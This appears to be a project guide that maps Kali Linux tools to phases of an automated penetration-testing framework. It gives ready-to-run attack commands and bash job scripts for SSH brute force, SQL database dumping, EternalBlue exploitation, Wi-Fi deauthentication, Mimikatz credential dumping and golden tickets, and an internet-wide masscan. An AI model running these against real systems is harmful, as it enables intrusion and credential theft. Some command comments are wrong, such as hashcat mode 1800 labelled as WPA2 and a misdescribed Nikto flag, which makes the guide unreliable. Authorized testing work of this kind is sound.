# Kali Linux Tools Integration Guide

**Framework**: Security Testing Multi-Agent with Kali Linux  
**Updated**: 2026-08-19  
**Status**: Production-Ready Integration

---

## Overview

This guide maps Kali Linux tools to each phase of the security testing framework, enabling comprehensive penetration testing orchestration.

---

## PHASE 1: Foundation & Reconnaissance

### Phase 1 Purpose
- Establish baseline security posture
- Gather initial target information
- Map network topology and services

### Tools & Integration

#### 🔍 Network Reconnaissance

**1. Nmap - Network Mapper**
- **Purpose**: Port scanning, service enumeration, OS detection
- **Key Features**: 
  - Fast TCP/UDP scanning
  - Service version detection
  - OS fingerprinting
  - Script execution (NSE)
- **Integration Point**: `request-context.js` - Track scanning source IPs
- **Usage**:
  ```bash
  nmap -sV -p- -A -T4 target.com
  nmap -sU -p 53,161,162 target.com          # UDP scan
  nmap --script vuln target.com              # Vulnerability scripts
  ```
- **Metrics**: Request context tracks scanning patterns
- **Rate Limiting**: Database rate limiter prevents scanner overload

**2. Masscan - Mass IP Port Scanner**
- **Purpose**: Ultra-fast port scanning of entire networks
- **Key Features**:
  - 6+ million packets per second
  - 65k ports scan in 5 minutes
  - Asynchronous scanning
  - XML output support
- **Integration Point**: Health check monitors scan progress
- **Usage**:
  ```bash
  masscan 0.0.0.0/0 -p0-65535 --rate 100000
  masscan target.com -p 443,80,8080 --echo > results.txt
  ```

**3. Whois & DNS Tools**
- **Purpose**: Domain ownership, registrar, DNS records
- **Key Features**:
  - Domain information gathering
  - Registrar details
  - Nameserver enumeration
- **Tools**: `whois`, `dig`, `nslookup`, `host`
- **Integration Point**: Audit logger records OSINT activities
- **Usage**:
  ```bash
  whois target.com
  dig target.com ANY                         # All DNS records
  dig target.com +trace                      # DNS trace
  nslookup -type=MX target.com              # Mail servers
  ```

**4. theHarvester - Email & Subdomain Harvesting**
- **Purpose**: Gather emails, subdomains, IP addresses
- **Key Features**:
  - Multiple data sources (Google, Bing, LinkedIn)
  - Email address extraction
  - Subdomain discovery
  - Shodan integration
- **Integration Point**: Schema validator for OSINT data
- **Usage**:
  ```bash
  theHarvester -d target.com -b google
  theHarvester -d target.com -b linkedin,twitter,google
  theHarvester -d target.com -l 100 -b shodan
  ```

**5. Recon-ng - Web Reconnaissance Framework**
- **Purpose**: Modular web reconnaissance framework
- **Key Features**:
  - 100+ reconnaissance modules
  - Database storage of findings
  - Reporting capabilities
  - API integration
- **Integration Point**: Bulk operations process reconnaissance data
- **Usage**:
  ```bash
  recon-ng
  > workspace create target.com
  > load google_site_web
  > run
  ```

---

## PHASE 2: Enumeration & Vulnerability Scanning

### Phase 2 Purpose
- Identify services and versions
- Discover vulnerabilities
- Detect misconfigurations
- Enumerate user accounts

### Tools & Integration

#### 🔎 Web Application Scanning

**1. Nikto - Web Server Scanner**
- **Purpose**: Web server vulnerability scanning
- **Key Features**:
  - 6,000+ vulnerability signatures
  - SSL/TLS testing
  - Server misconfiguration detection
  - Proxy support
- **Integration Point**: Database pool manages scan connections
- **Usage**:
  ```bash
  nikto -h http://target.com -p 80 -o report.html
  nikto -h http://target.com -ssl
  nikto -h http://target.com -Tuning x 6                # Skip CVSS scoring
  ```
- **Metrics**: Prometheus tracks scan duration and findings
- **Rate Limiting**: Endpoint rate limiter controls scan pace

**2. Nessus - Vulnerability Scanner**
- **Purpose**: Comprehensive vulnerability assessment
- **Key Features**:
  - 80,000+ vulnerability signatures
  - Compliance checking (PCI-DSS, HIPAA)
  - Configuration auditing
  - Multi-threaded scanning
- **Integration Point**: Circuit breaker handles scanner failures
- **Usage**:
  ```bash
  nessuscli scan new -name "scan1" -t basic target.com
  nessuscli scan list
  nessuscli scan download <scan_id> --file report.pdf
  ```
- **Performance**: Request timeout protection (30-60 minute scans)

**3. OpenVAS - Vulnerability Assessment**
- **Purpose**: Open-source vulnerability scanning
- **Key Features**:
  - 70,000+ vulnerability tests
  - Web-based interface
  - Scheduled scanning
  - PDF/Excel reports
- **Integration Point**: Audit logging for scan history
- **Usage**:
  ```bash
  openvas-check-setup              # Verify installation
  openvassd -v                     # Start vulnerability scanner daemon
  omp -h localhost -u admin -w password -T
  ```

#### 🗺️ Web Enumeration

**4. Wfuzz - Web Application Fuzzer**
- **Purpose**: Directory and parameter fuzzing
- **Key Features**:
  - Wordlist-based fuzzing
  - Multi-threading
  - Response filtering
  - Payload encoding
- **Integration Point**: Request signing validates fuzzer requests
- **Usage**:
  ```bash
  wfuzz -c -z file,common.txt --hc 404 http://target.com/FUZZ
  wfuzz -c -z file,parameters.txt -d "param=FUZZ" http://target.com/login
  wfuzz -c -z file,subdomains.txt -H "Host: FUZZ.target.com" http://target.com
  ```
- **Rate Limiting**: Per-endpoint limits prevent target overload

**5. Dirb/Dirbuster - Directory Brute Force**
- **Purpose**: Find hidden directories and files
- **Key Features**:
  - Wordlist scanning
  - Recursive scanning
  - Proxy support
  - Report generation
- **Integration Point**: Health check monitors scan progress
- **Usage**:
  ```bash
  dirb http://target.com /usr/share/dirb/wordlists/common.txt
  dirb http://target.com -r                  # Don't search recursively
  dirb http://target.com -o output.txt
  ```

#### 🔐 Credential Testing

**6. Hydra - Online Password Cracking**
- **Purpose**: Brute force authentication services
- **Key Features**:
  - 50+ protocol support
  - Parallel attacks
  - Wordlist support
  - Port scanning
- **Integration Point**: Database rate limiter prevents lockouts
- **Usage**:
  ```bash
  hydra -L userlist.txt -P passlist.txt ssh://target.com
  hydra -l admin -P passlist.txt ftp://target.com
  hydra -l user@target.com -P passlist.txt smtp://target.com:25 -e nsr
  ```
- **Security**: Respects rate limits to avoid account lockout

**7. SQLMap - SQL Injection Testing**
- **Purpose**: Automated SQL injection detection and exploitation
- **Key Features**:
  - Automatic payload generation
  - Database enumeration
  - User privilege escalation
  - Data exfiltration
- **Integration Point**: Schema validator checks SQL injection patterns
- **Usage**:
  ```bash
  sqlmap -u "http://target.com?id=1" --dbs
  sqlmap -u "http://target.com?id=1" -D database --tables
  sqlmap -u "http://target.com?id=1" --dump-all
  sqlmap -u "http://target.com" --data "user=admin&pass=test" --dbs
  ```
- **Timeout Protection**: Request timeout (30s) on scan queries

---

## PHASE 3: Exploitation & Advanced Testing

### Phase 3 Purpose
- Exploit identified vulnerabilities
- Establish persistence
- Escalate privileges
- Demonstrate business impact

### Tools & Integration

#### 🎯 Web Proxy & Burp Suite

**1. Burp Suite - Web Security Testing Platform**
- **Purpose**: Advanced web application security testing
- **Key Features**:
  - Proxy interception
  - Scanner
  - Intruder (fuzzer)
  - Repeater
  - Decoder
  - Collaborator
- **Integration Point**: Request signing validates Burp requests
- **Usage**:
  ```bash
  burpsuite &                                # Start GUI
  # Or use Community/Professional Edition
  burpsuite --project-file=scan.burp
  ```
- **Advanced**: API integration for automated scanning
  ```bash
  # Burp API for scan orchestration
  curl -X POST http://localhost:8080/api/v2/scans
  ```

**2. OWASP ZAP - Automated Security Scanner**
- **Purpose**: Open-source web application scanner
- **Key Features**:
  - Automatic scanning
  - Manual testing tools
  - Passive/active scanning
  - API for automation
- **Integration Point**: Circuit breaker handles scan failures
- **Usage**:
  ```bash
  zaproxy -config api.disablekey=true -f screenshotDir=/tmp
  zaproxy -cmd -quickurl http://target.com -quickout report.html
  ```

#### 🚀 Exploitation Frameworks

**3. Metasploit Framework - Exploitation**
- **Purpose**: Comprehensive exploitation framework
- **Key Features**:
  - 2,000+ exploits
  - 500+ payloads
  - Meterpreter sessions
  - Module development
- **Integration Point**: Feature flags enable/disable exploits
- **Usage**:
  ```bash
  msfconsole
  > search type:exploit platform:windows smb
  > use exploit/windows/smb/ms17_010_eternalblue
  > set RHOSTS 192.168.1.100
  > exploit
  ```
- **Risk Management**: Audit logging for all exploitation attempts

**4. Social Engineering Toolkit (SET)**
- **Purpose**: Automated social engineering attack framework
- **Key Features**:
  - Phishing email generation
  - Website cloning
  - Payload generation
  - Attack reporting
- **Integration Point**: Audit logger tracks social engineering activities
- **Usage**:
  ```bash
  setoolkit
  # Interactive menu-driven interface
  # 1. Social Engineering Attacks
  # 2. Phishing Attacks
  # 3. Web Attack Vectors
  ```

#### 🔓 Credential Attacks

**5. John the Ripper - Password Cracking**
- **Purpose**: Offline password cracking
- **Key Features**:
  - 15+ hash formats
  - Dictionary attacks
  - Brute force
  - Rule-based attacks
  - GPU acceleration
- **Integration Point**: Performance benchmarks track crack time
- **Usage**:
  ```bash
  john --format=md5 --wordlist=rockyou.txt hashes.txt
  john --format=bcrypt passwords.txt --rules=SingleExtra
  john --incremental --max-length=8 hashes.txt
  john --show hashes.txt                     # Display cracked passwords
  ```

**6. Hashcat - GPU Password Cracking**
- **Purpose**: GPU-accelerated password cracking
- **Key Features**:
  - Multi-GPU support
  - 300+ hash types
  - Rule-based attacks
  - Fast performance (billion+ hashes/sec)
- **Integration Point**: Performance benchmarks track throughput
- **Usage**:
  ```bash
  hashcat -m 0 -a 0 hashes.txt rockyou.txt  # MD5 with dictionary
  hashcat -m 1000 -a 0 hashes.txt wordlist.txt  # NTLM
  hashcat -m 1800 -a 3 hashes.txt ?a?a?a?a  # WPA2 brute force
  ```

#### 🌐 Network Analysis

**7. Wireshark - Network Protocol Analyzer**
- **Purpose**: Real-time network traffic analysis
- **Key Features**:
  - Live packet capture
  - Protocol analysis
  - Statistics and graphs
  - Filtering and searching
- **Integration Point**: Request context logs network flows
- **Usage**:
  ```bash
  wireshark
  # Or capture from CLI
  tshark -i eth0 -f "tcp port 80" -w capture.pcap
  tshark -r capture.pcap -Y "http.request" | head -20
  ```

**8. tcpdump - Packet Sniffer**
- **Purpose**: Command-line packet capture
- **Key Features**:
  - BPF filter syntax
  - PCAP output
  - Real-time analysis
  - Low overhead
- **Integration Point**: Audit logger records network events
- **Usage**:
  ```bash
  tcpdump -i eth0 -n port 80
  tcpdump -i eth0 -n "tcp port 443" -w ssl.pcap
  tcpdump -r ssl.pcap -n -A | grep -i password
  ```

#### 📡 Wireless Testing

**9. Aircrack-ng Suite - WiFi Security**
- **Purpose**: Wireless network security testing
- **Key Features**:
  - WEP/WPA/WPA2 cracking
  - Packet injection
  - Evil twin attacks
  - Deauthentication attacks
- **Integration Point**: Circuit breaker for attack retries
- **Tools**: `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`
- **Usage**:
  ```bash
  airmon-ng start wlan0                      # Monitor mode
  airodump-ng wlan0mon                       # Scan networks
  aireplay-ng -0 10 -a [BSSID] wlan0mon     # Deauth attack
  aircrack-ng -w rockyou.txt capture.cap    # Crack WPA2
  ```

#### 🪟 Windows Exploitation

**10. Mimikatz - Credential Dumping**
- **Purpose**: Extract credentials from Windows memory
- **Key Features**:
  - NTLM hash extraction
  - Kerberos ticket dumping
  - Golden ticket generation
  - Pass-the-hash attacks
- **Integration Point**: Secrets manager stores extracted credentials
- **Usage**:
  ```bash
  mimikatz.exe
  mimikatz # privilege::debug
  mimikatz # lsadump::sam                    # Dump SAM
  mimikatz # sekurlsa::logonpasswords        # Memory passwords
  mimikatz # kerberos::golden /domain:DOMAIN /sid:S-1-5-21-... /user:Admin
  ```

---

## Integration Architecture

### Phase 1 Tools Integration
```
User Request
    ↓
Request Context (Tracking)
    ↓
[Nmap, Masscan, Whois, theHarvester, Recon-ng]
    ↓
Health Check (Scan Status)
    ↓
Structured Logger (JSONL Output)
    ↓
Database Rate Limiter (Prevent Overload)
    ↓
Findings Stored
```

### Phase 2 Tools Integration
```
Scanner Request
    ↓
Request Timeout (30-60 min limit)
    ↓
[Nikto, Nessus, OpenVAS, Wfuzz, Dirb, Hydra, SQLMap]
    ↓
Database Pool (Concurrent Scans)
    ↓
Prometheus Metrics (Track Progress)
    ↓
Circuit Breaker (Handle Failures)
    ↓
Findings Aggregation
```

### Phase 3 Tools Integration
```
Exploitation Request
    ↓
Schema Validator (Payload Validation)
    ↓
[Metasploit, Burp, OWASP ZAP, SET, John, Hashcat]
    ↓
Request Signing (Verify Legitimacy)
    ↓
Feature Flags (Enable/Disable)
    ↓
Audit Logger (Track All Actions)
    ↓
Circuit Breaker (Retry Logic)
    ↓
Performance Benchmarks (Success Rate)
    ↓
Results + Impact Assessment
```

---

## Kali Linux Tool Categories

### By Testing Type

#### Reconnaissance & OSINT
- Nmap
- Masscan
- Whois
- DNS Tools (dig, nslookup, host)
- theHarvester
- Recon-ng
- Shodan CLI

#### Scanning & Enumeration
- Nikto
- Nessus
- OpenVAS
- Wfuzz
- Dirb/Dirbuster
- Smbmap
- rpcclient

#### Web Application Testing
- Burp Suite
- OWASP ZAP
- SQLMap
- XSSstrike
- DomXSSScanner
- NoSQLMap

#### Credential Testing
- Hydra
- Medusa
- John the Ripper
- Hashcat
- Ophcrack
- Crowbar

#### Exploitation
- Metasploit Framework
- Exploit-DB
- Social Engineering Toolkit (SET)
- BeEF (Browser Exploitation Framework)
- Msfconsole

#### Wireless Testing
- Aircrack-ng
- Wifite
- Kismet
- Reaver
- Pixiewps

#### Network Analysis
- Wireshark
- tcpdump
- tshark
- Ettercap
- Scapy
- ngrep

#### Cryptography
- GPG
- OpenSSL
- John the Ripper
- Hashcat

#### System & Privilege Escalation
- Mimikatz
- Bloodhound
- Linpeas
- Winpeas
- Powerup

---

## Implementation Best Practices

### 1. Tool Selection Per Phase

**Phase 1**: Use passive reconnaissance tools
- Minimal network impact
- OSINT-focused
- Information gathering only
- No active exploitation

**Phase 2**: Use active scanning tools
- Controlled network impact
- Vulnerability detection
- Configuration review
- Service enumeration

**Phase 3**: Use exploitation tools
- Full-featured testing
- Privilege escalation
- Impact verification
- Post-exploitation analysis

### 2. Rate Limiting & Safety

```javascript
// Rate limit tool execution
const rateLimiter = new DatabaseRateLimiter({
  perUser: 100,        // 100 requests/minute per user
  perTenant: 1000,     // 1000 requests/minute per tenant
  queryTimeout: 300000  // 5 minute timeout for long scans
});

// Prevent tool overload
const timeoutWrapper = new RequestTimeout({
  timeout: 3600000,    // 1 hour max for Nessus scans
  continueOnError: true
});
```

### 3. Audit & Logging

```javascript
// Log all tool invocations
const auditLogger = new AuditLogger({
  events: [
    'TOOL_STARTED',
    'TOOL_COMPLETED',
    'TOOL_FAILED',
    'EXPLOIT_EXECUTED',
    'CREDENTIAL_DUMPED'
  ]
});
```

### 4. Circuit Breaker for Reliability

```javascript
// Handle tool failures gracefully
const circuitBreaker = new CircuitBreakerRegistry({
  failureThreshold: 3,
  resetTimeout: 60000,
  service: 'nessus-scanner'
});
```

---

## Execution Examples

### Phase 1: Reconnaissance Job

```bash
#!/bin/bash

TARGET="target.com"
OUTPUT_DIR="reconnaissance"

echo "[*] Starting Phase 1 Reconnaissance..."

# DNS Enumeration
echo "[+] DNS Enumeration..."
nslookup $TARGET > $OUTPUT_DIR/dns.txt
dig $TARGET ANY >> $OUTPUT_DIR/dns.txt

# Subdomain Discovery
echo "[+] Subdomain Discovery..."
theHarvester -d $TARGET -b google -l 100 > $OUTPUT_DIR/subdomains.txt

# Port Scanning
echo "[+] Port Scanning..."
nmap -sV -p- -A $TARGET > $OUTPUT_DIR/nmap.txt

# Email Harvesting
echo "[+] Email Harvesting..."
theHarvester -d $TARGET -b linkedin,twitter > $OUTPUT_DIR/emails.txt

echo "[*] Phase 1 Complete - Results in $OUTPUT_DIR"
```

### Phase 2: Vulnerability Scanning Job

```bash
#!/bin/bash

TARGET="http://target.com"
OUTPUT_DIR="scanning"

echo "[*] Starting Phase 2 Vulnerability Scanning..."

# Web Server Scanning
echo "[+] Nikto Web Scan..."
nikto -h $TARGET -o $OUTPUT_DIR/nikto.html

# Directory Brute Force
echo "[+] Directory Enumeration..."
dirb $TARGET /usr/share/dirb/wordlists/common.txt -o $OUTPUT_DIR/dirb.txt

# Web Fuzzing
echo "[+] Parameter Fuzzing..."
wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt \
  --hc 404 $TARGET/FUZZ -o $OUTPUT_DIR/wfuzz.txt

# SQL Injection Testing
echo "[+] SQLMap Testing..."
sqlmap -u "$TARGET?id=1" --dbs --batch -o $OUTPUT_DIR/sqlmap.txt

echo "[*] Phase 2 Complete - Results in $OUTPUT_DIR"
```

### Phase 3: Exploitation Job

```bash
#!/bin/bash

TARGET="192.168.1.100"
OUTPUT_DIR="exploitation"

echo "[*] Starting Phase 3 Exploitation..."

# Metasploit Exploitation
echo "[+] Running Metasploit..."
msfconsole -r exploit.rc -o $OUTPUT_DIR/msfconsole.log

# Credential Cracking
echo "[+] Cracking Hashes..."
john --wordlist=rockyou.txt --format=md5 hashes.txt | tee $OUTPUT_DIR/cracked.txt

# Password Dictionary Attack
echo "[+] SSH Brute Force (Rate Limited)..."
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  -t 4 -W 10 ssh://$TARGET | tee $OUTPUT_DIR/hydra.txt

echo "[*] Phase 3 Complete - Results in $OUTPUT_DIR"
```

---

## Metrics & Reporting

### Phase 1 Metrics
- Total hosts discovered
- Services identified
- Email addresses harvested
- DNS records enumerated

### Phase 2 Metrics
- Vulnerabilities found
- Services scanned
- Scan duration
- False positives rate

### Phase 3 Metrics
- Successful exploits
- Credentials recovered
- Systems compromised
- Privilege escalation rate
- Time to compromise (TTC)

---

## Security Considerations

### Authorization
- ✅ Only run on authorized targets
- ✅ Obtain written approval before testing
- ✅ Define scope clearly
- ✅ Log all activities

### Safety
- ✅ Use isolated lab environment
- ✅ Set resource limits
- ✅ Monitor for system impact
- ✅ Have rollback procedures

### Compliance
- ✅ OWASP Top 10
- ✅ NIST Cybersecurity Framework
- ✅ PCI DSS (for payment systems)
- ✅ HIPAA (for healthcare data)

---

## Conclusion

This comprehensive mapping provides:

✅ **30+ Kali Linux tools** organized by phase  
✅ **Phase-appropriate tooling** with integration points  
✅ **Safety mechanisms** (rate limiting, timeouts, circuit breakers)  
✅ **Audit trails** for compliance  
✅ **Example usage** for each tool  
✅ **Best practices** for secure testing  

Ready for production penetration testing orchestration!

---

**For more information**: See `FRAMEWORK_COMPLETE.md` and `SECURITY_FIXES.md`
